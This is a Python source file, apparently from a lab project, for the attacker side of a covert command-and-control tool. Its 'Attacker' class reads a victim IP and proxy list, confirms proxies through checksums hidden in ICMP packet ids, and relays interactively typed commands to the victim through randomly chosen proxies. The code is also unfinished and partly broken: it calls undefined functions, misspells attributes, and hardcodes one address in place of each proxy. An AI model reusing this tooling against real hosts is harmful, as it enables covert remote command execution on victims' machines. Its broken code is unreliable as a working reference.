#from scapy.all import * 
from scapy.all import IP, ICMP, Raw 

import datetime 
import time
import ipaddress
import sys 
import os 
import argparse 
import re 
import random
import threading
from functools import partial 
import json
import type_singleton as singleton
import socket

file_path = "../comunication_methods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import comunication_methods as com

file_path = "../mymethods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import mymethods 


#----------------------------------------- 
def callback_wait_proxy_update(ip_vittima:ipaddress.IPv4Address|ipaddress.IPv6Address, thread_lock:threading.Lock, thread_proxy_response:dict, event_proxy_update:threading.Event): 
    def callback(packet):
        print(f"callback attacker_wait_proxy_update received:\n\t{packet.summary()}")
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
            try:
                confirm_text=com.CONFIRM_VICTIM+ip_vittima.compressed+"_"+ipaddress.ip_address(packet[IP].src).compressed
            except Exception as e:
                print(f"callback attacker_wait_proxy_update: {e}", file=sys.stderr)
                com.update_thread_response(
                    ipaddress.ip_address(packet[IP].src)
                    ,thread_lock
                    ,thread_proxy_response
                    ,response=False
                )
                if not event_proxy_update.get(packet[IP].src).is_set():
                    com.set_threading_Event(event_proxy_update.get(packet[IP].src))
                return
            checksum=mymethods.calc_checksum((confirm_text).encode()) 
            if packet[ICMP].id==checksum: 
                com.update_thread_response(
                    ipaddress.ip_address(packet[IP].src)
                    ,thread_lock
                    ,thread_proxy_response
                    ,response=True
                )
                if not event_proxy_update.get(packet[IP].src).is_set():
                    com.set_threading_Event(event_proxy_update.get(packet[IP].src))
    return callback

#----------------------------------------- 
def reset_event_update_foreach_proxy(proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[],event_proxy_update:dict={}):
    try:
        if not com.is_list(proxy_list) or len(proxy_list)<=0:
            raise ValueError(f"proxy_list non è una lista o è vuota: {proxy_list}")
        if not com.is_dictionary(event_proxy_update):
            raise ValueError(f"La lista degli eventi non è un dizionmario: {event_proxy_update}")
    except Exception as e:
        raise Exception(f"reset_event_update_foreach_proxy: {e}") 
    for proxy in proxy_list:
        event_proxy_update.get(proxy.compressed).clear() 

def create_event_update_foreach_proxy(proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]):
    try:
        if not com.is_list(proxy_list) or len(proxy_list)<=0:
            raise ValueError(f"proxy_list non è una lista o è vuota: {proxy_list}")
    except Exception as e:
        raise Exception(f"create_event_update_foreach_proxy: {e}")
    event_proxy_update={}
    for proxy in proxy_list:
        event_proxy_update.update({proxy.compressed:com.get_threading_Event()})    
    reset_event_update_foreach_proxy(proxy_list, event_proxy_update)
    #print(f"Eventi creati:\t{event_proxy_update}")
    print("Per ogni proxy creato il proprio evento di aggiornamento 'proxy_update'")
    return event_proxy_update 

#-----------------------------------------
def elimina_proxy_nonconnessi(thread_lock:threading.Lock=None, thread_response:dict=None, proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]):
    try:
        com.is_threading_lock(thread_lock) 
        com.is_dictionary(thread_response) 
        if not com.is_list(proxy_list) or len(proxy_list)<=0: 
            raise ValueError("elimina_proxy_nonconnessi: lista proxy non valida")
    except Exception as e:
        raise Exception(f"elimina_proxy_nonconnessi: {e}")
    thread_lock.acquire() 
    proxy_response=thread_response.items()
    thread_lock.release()   
    for proxy,value in proxy_response: 
        try: 
            if not value: 
                proxy_list.remove(ipaddress.ip_address(proxy)) 
        except Exception as e:
            print(f"check_available_proxies: {proxy} not present in list. {e}")

def sanifica_lista_proxy(proxy_list:list=None):
    try: 
        com.is_list(proxy_list)
    except Exception as e:
        raise Exception(f"sanifica_lista_proxy: {e}") 
    new_proxy_list=[address for proxy in proxy_list if (address:=com.is_valid_ipaddress(proxy)) is not None]
    print(f"Lista proxy sanificata: {new_proxy_list}")
    return new_proxy_list

def set_proxy_list(config_file):
    proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]
    for dict_proxy in config_file.get("proxy_list", []):
        if not isinstance(dict_proxy, dict):
            print(f"proxy is not dict: {dict_proxy}")
            continue 
        for value in dict_proxy.values(): 
            try:
                proxy_ip=ipaddress.ip_address(value)
                proxy_list.append(proxy_ip)  
            except Exception as e:
                print(f"\tset_proxy_list: {e}") 
    print(f"Lista proxy sanificata")
    return proxy_list
#-----------------------------------------
def setIP_host():
        ip, errore=mymethods.find_local_IP() 
        if ip is None:
            ip="192.168.56.104"
        ip_host=ipaddress.ip_address(ip)        
        if not isinstance(ip_host, ipaddress.IPv4Address) and not isinstance(ip_host, ipaddress.IPv6Address):
            #print(f"Coulnd't get ip: {errore}") if ip_host is None else print(ip_host)
            raise ValueError(f"L'indirizzo IP del host non è valido: {ip_host}:{errore}") 
        return ip_host

def setIP_vittima(config_file):
        ip_vittima = ipaddress.ip_address(config_file.get("ip_vittima", None))  
        if ip_vittima is None or not (isinstance(ip_vittima, ipaddress.IPv4Address) or isinstance(ip_vittima, ipaddress.IPv6Address)):
            raise ValueError(f"L'indirizzo IP della vittima non è valido: {ip_vittima}") 
        return ip_vittima

def attack_type(json_file): 
        attack_function = singleton.AttackType().get_attack_function(json_file.get("attack_function"))
        if not isinstance(attack_function, dict) or len(attack_function.items())!=1:
            print(f"Funzione di attacco non definita ",
                f"non è un dizionario ma {type(attack_function)}" if not isinstance(attack_function, dict) 
                else f"funzioni ricavate {len(attack_function.items())}" if len(attack_function.items())!=1
                else None
            )
            attack_function=singleton.AttackType().choose_attack_function() 
        return attack_function

def load_config_file(default_file_path, path_of_file): 
        if not os.path.exists(path_of_file) or not str(path_of_file).endswith(".json"):
            if os.path.exists(default_file_path):
                print(f"\tFile di configurazione {file_path}  non trovato, si usa quello di default")
                path_of_file=default_file_path
            else: 
                raise FileNotFoundError(f"I file {path_of_file} e {default_file_path} non esistono")
        with open(path_of_file, 'r') as file: 
            print(f"File di configurazione {path_of_file} caricato correttamente") 
            return json.load(file)

#----------------------------------------- 
def check_value_in_parser(args):
    if not isinstance(args,argparse.Namespace): 
        raise Exception(f"Argomento parser non è istanza di argparse.Namespace")  
    if not isinstance(args.file_path,str):
        raise Exception(f"--file_path non specificato: {args.file_path}") 
    return True

def get_args_from_parser(): 
    parser = argparse.ArgumentParser()
    parser.add_argument("--file_path",type=str, help="File di configurazione")  
    try:
        args, unknown =mymethods.check_for_unknown_args(parser)  
        if len(unknown) > 0: 
            raise Exception(f"Argomenti sconosciuti: {unknown}") 
        if check_value_in_parser(args):  
            return args
    except Exception as e:
        mymethods.print_parser_supported_arguments(parser)
        raise Exception(f"get_args_from_parser: {e}") 

#-----------------------------------------
class Attacker:
    default_file_path:str = "./attack_file.json"    
    
    def __init__(self): 
        try:
            args=get_args_from_parser() 
            dict_values={
                "file_path":args.file_path  
            }
            config_file=load_config_file(self.default_file_path, dict_values.get("file_path"))
        except Exception as e: 
            print(f"__init__ load file: {e}", file=sys.stderr)
            exit(1) 
        try:
            self.attack_function=attack_type(config_file)
            print(f"Attacco selezionato: {self.attack_function}") 
            self.ip_vittima=setIP_vittima(config_file)
            print(f"IP vittima valido: {type(self.ip_vittima) } {self.ip_vittima }")
            self.ip_host=setIP_host()  
            print(f"IP host valido: {type(self.ip_host)} {self.ip_host}")
            self.proxy_list=set_proxy_list(config_file) 
        except Exception as e:
            print(f"__init__ main variable: {e}", file=sys.stderr)
            exit(1)  
        try:
            self.list_proxy_socket:list[socket.socket]=[]
            for proxy in self.proxy_list:
                print("Socket proxy: ",proxy)
                #basic_socket
                #with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                try:
                    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect(("192.168.56.104", 4567))
                    s.sendall(com.CONFIRM_ATTACKER.encode())
                    data=s.recv(1024)
                    print(f"\tReceived: {data}")
                    if not data:
                        print("Close connection")  
                except Exception as e:
                    print(f"Eccezione: {e}") 

        except Exception as e:
            print(f"__init__ connected proxy: {e}") 
            exit(0)
    
    def wait_proxy_update(self,proxy:ipaddress.IPv4Address|ipaddress.IPv6Address): 
        #print("\n\t(＾▽＾)\tattacker_wait_proxy_update\n") 
        try: 
            if not isinstance(self.ip_vittima, ipaddress.IPv4Address) and not isinstance(self.ip_vittima, ipaddress.IPv6Address):
                raise Exception(f"Indirizzo IP vittima non è ne un IPv4Address ne un IPv6Address: {self.ip_vittima}")
            if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
                raise Exception(f"Indirizzo IP proxy non è ne un IPv4Address ne un IPv6Address: {proxy}")
        except Exception as e:
            print(f"attacker_wait_proxy_update: {e}")
            return None
        
        try:
            confirm_text=com.CONFIRM_VICTIM + self.ip_vittima.compressed + "_" + proxy.compressed  
            #if len(confirm_text.split("_"))!=7:
            #    raise ValueError(f"Testo di conferma non valido") 
            #print(f"Testo di conferma impostato correttamente:\n\t{confirm_text}")
            checksum=mymethods.calc_checksum(confirm_text.encode()) 
            interface_4_proxy,_= mymethods.iface_src_from_IP(proxy)  
            if interface_4_proxy is None:
                raise ValueError(f"Interfaccia non valida {interface_4_proxy}")
            #elif interface_4_proxy=="lo": 
                #print(f"Interfaccia per l'aggiornamento di {proxy} -> loopback")
                #com.update_thread_response(proxy, self.thread_lock, self.thread_proxy_response, True) 
                #return com.get_thread_response(proxy,self.thread_lock,self.thread_proxy_response)
            print(f"Interfaccia per l'aggiornamento di {proxy} -> {interface_4_proxy}")
        except Exception as e:
            print(f"attacker_wait_proxy_update: {e}")
            return None
        
        filter=singleton.AttackType().get_filter_connection_from_function(
            "wait_proxy_update", proxy, checksum
        )
        event_thread=self.event_proxy_update.get(proxy.compressed)

        args={
            "filter":filter
            #,"count":"1" 
            ,"prn":callback_wait_proxy_update(
                 self.ip_vittima
                ,self.thread_lock
                ,self.thread_proxy_response
                ,event_thread
            )
            #,"store":True 
            ,"iface":interface_4_proxy
        } 
        try:
            thread_sniffer,thread_timer=com.sniff_packet(args,event=event_thread) 
            com.wait_threading_Event(event_thread) 
        except Exception as e:
            raise Exception(f"attacker_wait_conn_from_proxy: {e}") 
        if thread_sniffer and thread_sniffer.running: 
            thread_sniffer.stop()  
        if thread_timer and thread_timer.is_alive():
            thread_timer.cancel()  
        thread_response=com.get_thread_response(proxy,self.thread_lock,self.thread_proxy_response)
        #print(f"Risposta del proxy: {thread_response}")
        if thread_response: 
            print(f"Il proxy {proxy} è connesso alla vittima {self.ip_vittima}")
        else:
            print(f"Il proxy {proxy} non è connesso alla vittima {self.ip_vittima}",file=sys.stderr)  
        return thread_response  
    
    
    
    
    
    #------------------------------
    def send_command_to_victim(self):
        self.received_data=initialize_list_for_data(self.proxy_list)
        self.data_lock=threading.Lock()
        self.event_thread_update=create_event_update_foreach_proxy(self.proxy_list)
        self.thread_lock,self.thread_proxy_response,self.thread_list=com.setup_thread_4_foreach_proxy(
            self.proxy_list,callback_function=self.wait_data_from_proxy)
        self.event_received_data=com.get_threading_Event()
        print("Attivo i thread per ricevere i dati") 
        for thread in self.thread_list.values():
            thread.start()
        #
        command=ask_command()
        print(f"il comando immesso è {command}")
        while command.lower() not in com.exit_cases:
            try:
                chosen_proxy=random.choice(self.proxy_list)
                print(f"il proxy scelto è {chosen_proxy}")
            except Exception as e:
                raise ValueError(f"send_command_to_victim: {e}") 
            send_start_to_proxies(chosen_proxy, self.proxy_list)
            chosen_proxy=send_command_to_chosen_proxy(command, chosen_proxy, self.proxy_list)
            for thread in self.thread_list.values():
                thread.join()
            print(self.thread_proxy_response)
            print(self.received_data)
            reset_event_update_foreach_proxy(self.proxy_list, self.event_thread_update)
            command=input(f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> ")
        print("Uscita dalla shell\texit") 
        update_proxies_end_communication(self.proxy_list)

    def wait_data_from_proxy(self,proxy):
        interface_4_proxy,_= mymethods.iface_src_from_IP(proxy)   
        filter=singleton.AttackType().get_filter_connection_from_function(
            "wait_proxy_update", proxy, ip_host=self.ip_host
        )

        args={
            "filter":filter
            #,"count":1 
            ,"prn": callback_wait_data_from_proxy()
            #,"store":True 
            ,"iface":interface_4_proxy
        }  
        try:
            event_thread=self.event_thread_update.get(proxy)
            thread_sniffer,thread_timer=com.sniff_packet(args,event=event_thread) 
            com.wait_threading_Event(event_thread) 
        except Exception as e:
            raise Exception(f"attacker_wait_conn_from_proxy: {e}") 
        print("inzio a fermare lo sniffer e il timer")
        if thread_sniffer and thread_sniffer.runing:
            com.stop_sinffer(thread_sniffer)
        if com.stop_timer(thread_timer): 
            print(f"{proxy} ha mandato i dati in tempo")
            com.update_thread_response(
                 proxy
                ,self.thread_lock
                ,self.thread_proxy_response
                ,True
            )
            return True 
        print(f"{proxy} non ha mandato i dati in tempo")
        com.update_thread_response(
             proxy
            ,self.thread_lock
            ,self.thread_proxy_response
            ,False
        )
        return False

    

if __name__=="__main__": 
    Attacker()
    #Fare 2a parte
